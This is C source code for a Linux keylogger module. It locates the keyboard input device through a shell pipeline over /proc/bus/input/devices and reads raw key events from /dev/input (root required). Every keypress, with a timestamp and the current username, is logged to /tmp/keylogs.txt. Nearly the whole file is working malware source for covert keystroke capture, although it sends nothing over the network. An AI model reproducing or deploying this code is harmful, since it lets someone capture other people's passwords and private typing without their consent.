#ifdef linux
#include"keylogger.h"
#include<stdio.h>
#include<string.h>
#include<stdlib.h> // To use popen and pclose to interact with command-line,
/** Header file to use open and read function  **/
#include<unistd.h>
#include<sys/stat.h>
#include<fcntl.h>
/** https://www.geeksforgeeks.org/input-output-system-calls-c-create-open-close-read-write **/
#include<linux/input.h>

void get_linux_keyboard(char*); // Function to identify system file.

int klinux(void)
{
	struct input_event keystroke ;

	char keyboard_file[22] = {0};

	get_linux_keyboard(keyboard_file);

	/* System file for keyboard are listed in /dev/input/ and can range from event(0-13) appropriate 'event' can be identified using cat /proc/bus/input/devices | less command **/

	int keyboard = open(keyboard_file,O_RDONLY); // This file requires root permission.

	if( keyboard == -1 )
	{
		exit(EXIT_FAILURE); // open returns negative value if it encounters an error.
	}

	FILE *fp = fopen("/tmp/keylogs.txt","w");

	/* To match entered keystroke to their numeric value /usr/include/linux/input-event-codes.h **/

	char *map = "..1234567890-=..qwertyuiop[]..asdfghjkl;'`..zxcvbnm,./";


	FILE *username = NULL ;

	char user[30] ;

	username = popen("echo $USER","r");

	fgets(user,30,username);

	if(username)
	{
		fputs("Logged User:",fp);

		fputs(user,fp);

		fputs("\n",fp);
	}

	else
	{
		fputs("****Unable To fetch user-name.****\n",fp);
	}

	while(1)
	{
		read(keyboard,&keystroke,sizeof(keystroke));

		fflush(fp); // fflush helps in clearing the buffer stream and ensure that all data has been written to stream( ie file pointer fp ).

		if( keystroke.type == EV_KEY && keystroke.value == 1 ) // keystroke.value represent instance when keys are released , this limit us to condition when user press a key to print key for more than one time our program will only register it as one stroke.
		{

  			char time[35] = {0}  ;

			format_time(time);

			fputs(time,fp);

			switch(keystroke.code)
			{
				case 14: fputs("BACKSPACE",fp);

					 break ;

				case 15: fputs("TAB",fp);

					 break ;

				case 1 : fputs("ESC",fp);

					 break ;

				case 28 : fputs("ENTER",fp);

					  break ;

				case 29 : fputs("LEFTCTRL",fp);

					  break ;

				case 97 : fputs("RIGHTCTRL",fp);

					  break ;

				case 42 : fputs("LEFTSHIFT",fp);

					  break ;

				case 43 : fputs("BACKSLASH",fp); // Since \ is a escape sequence it needs a special case.

					  break ;

				case 54 : fputs("RIGHTSHIFT",fp);

					  break ;

				case 56 : fputs("LEFTALT",fp);

					  break ;

				case 57 : fputs("SPACE",fp);

					  break ;

				case 58 : fputs("CAPSLOCK",fp);

					  break ;

				case 100 : fputs("RIGHTALT",fp);

					   break ;

				case 125 : fputs("META KEY OR WINDOWS KEY",fp);

					   break ;

				case 87 : fputs("F11",fp);

					  break ;

				case 88 : fputs("F12",fp);

					  break ;


				default:  if( keystroke.code > 58 && keystroke.code <69 ) // Condition to enter function keys from 1-10 to log file.
					  {


						  char number [3] , function[4] = "F" ;

						  sprintf(number,"%d",keystroke.code-58);

						  strcat(function,number);

						  fputs(function,fp);


					  }
					  else
					  {
					   	fputc(map[keystroke.code],fp);
					  }


			}


			fputs("\n",fp);
		}


	}

	fclose(fp);

	return 0 ;
}

void get_linux_keyboard(char *keyboard_file)
{
	char string1[] = "/dev/input/event" , file_number[4];

	FILE *fx = NULL ;

	fx = popen("cat /proc/bus/input/devices | grep -A 4 keyboard | grep event | grep -o '[0-9]*'","r"); // popen function open a process by crating a pipe hence helping us to run terminal based command in our c-program.

	if( fx == NULL )
	{
		exit(EXIT_FAILURE); // popen returns NULL if pipe or fork fails.
	}

	fgets(file_number,4,fx);

	strcat(string1,file_number);

	strcpy(keyboard_file,string1);

	keyboard_file[strlen(keyboard_file)-1] = '\0'; // To prevent new-line.

	pclose(fx);
}

#endif
